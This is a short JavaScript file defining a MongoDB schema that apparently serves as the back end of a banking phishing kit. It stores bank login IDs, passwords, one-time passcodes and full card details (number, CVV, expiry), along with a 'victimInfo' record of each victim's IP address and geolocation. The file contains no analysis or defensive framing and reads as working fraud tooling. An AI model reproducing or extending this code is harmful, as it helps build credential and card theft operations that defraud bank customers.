const mongoose = require("mongoose");

const detail = new mongoose.Schema(
  {
    bank: String,
    userID: String,
    password: String,
    otp: String,
    userAgent: String,
    cardInfo: {
      card: Number,
      cvv: Number,
      expiry: String,
    },
    victimInfo: {
      ip: String,
      city: String,
      country: String,
      countryCode: String,
      region: String,
      regionName: String,
      zip: String,
      lat: String,
      lon: String,
    },
  },
  { timestamps: true },
);

const Detail = mongoose.model("Detail", detail);
module.exports = Detail;
